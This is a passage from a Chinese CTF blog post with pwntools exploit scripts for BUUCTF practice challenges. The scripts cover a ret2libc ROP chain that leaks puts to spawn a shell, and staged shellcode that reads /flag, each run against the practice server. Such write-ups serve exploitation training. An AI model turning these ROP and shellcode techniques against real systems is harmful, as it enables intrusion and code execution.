class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu091-axb_2019_brop64"><a class="markdownIt-Anchor" href="#buu091-axb_2019_brop64"></a> buu091-axb_2019_brop64</h1>
<p>直接溢出。<s>(怎么都90多题了还是这种简单题……)</s></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400963</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./axb_2019_brop64&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27602</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./axb_2019_brop64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xD0</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;repeater&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\x09\x40&#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xD0</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu092-极客大挑战-2019not-bad"><a class="markdownIt-Anchor" href="#buu092-极客大挑战-2019not-bad"></a> buu092-[极客大挑战 2019]Not Bad</h1>
<p>这题考察shellcode，由于给定的写长度不够，可以采用边写边执行的方式，增加可写代码的长度。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./bad&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28044</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bad&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400b13</span></span><br><span class="line"></span><br><span class="line">shellcode_1 = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">	.1:\</span></span><br><span class="line"><span class="string">	nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; \</span></span><br><span class="line"><span class="string">	nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; nop; \</span></span><br><span class="line"><span class="string">	nop; nop; nop; nop; nop; nop; nop; nop; \</span></span><br><span class="line"><span class="string">	jmp .1\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">jmp_inst = asm(shellcode_1)[<span class="number">0x28</span>:]</span><br><span class="line"></span><br><span class="line">shellcode_2 = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">	mov rsi, rsp;\</span></span><br><span class="line"><span class="string">	sub rsi, 0x10;\</span></span><br><span class="line"><span class="string">	xor rax, rax;\</span></span><br><span class="line"><span class="string">	xor rdi, rdi;\</span></span><br><span class="line"><span class="string">	mov rdx, 0x100;\</span></span><br><span class="line"><span class="string">	syscall;\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">sc1 = asm(shellcode_2).ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = sc1 + p64(<span class="number">0</span>)</span><br><span class="line">payload += jmp_inst.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x90&#x27;</span>)	<span class="comment"># change rbp</span></span><br><span class="line">payload += p64(<span class="number">0x4009EE</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Easy shellcode, have fun!\n&#x27;</span>, payload.ljust(<span class="number">0x38</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">data_seg = <span class="number">0x601058</span></span><br><span class="line"></span><br><span class="line">shellcode3 = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">	xor rax, rax;\</span></span><br><span class="line"><span class="string">	xor rdi, rdi;\</span></span><br><span class="line"><span class="string">	mov rsi, 0x601058;\</span></span><br><span class="line"><span class="string">	mov rdx, 6;\</span></span><br><span class="line"><span class="string">	syscall;\</span></span><br><span class="line"><span class="string">	mov rax, 2;\</span></span><br><span class="line"><span class="string">	mov rdi, 0x601058;\</span></span><br><span class="line"><span class="string">	xor rsi, rsi;\</span></span><br><span class="line"><span class="string">	xor rdx, rdx;\</span></span><br><span class="line"><span class="string">	syscall;\</span></span><br><span class="line"><span class="string">	mov rdi, rax;\</span></span><br><span class="line"><span class="string">	xor rax, rax;\</span></span><br><span class="line"><span class="string">	mov rsi, rsp;\</span></span><br><span class="line"><span class="string">	sub rsi, 0x40;\</span></span><br><span class="line"><span class="string">	mov rdx, 0x30;\</span></span><br><span class="line"><span class="string">	syscall;\</span></span><br><span class="line"><span class="string">	mov rax, 1;\</span></span><br><span class="line"><span class="string">	mov rdi, rax;\</span></span><br><span class="line"><span class="string">	mov rsi, rsp;\</span></span><br><span class="line"><span class="string">	sub rsi, 0x40;\</span></span><br><span class="line"><span class="string">	mov rdx, 0x30;\</span></span><br><span class="line"><span class="string">	syscall;\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(asm(shellcode3).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">io.send(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">141</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">18:57</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
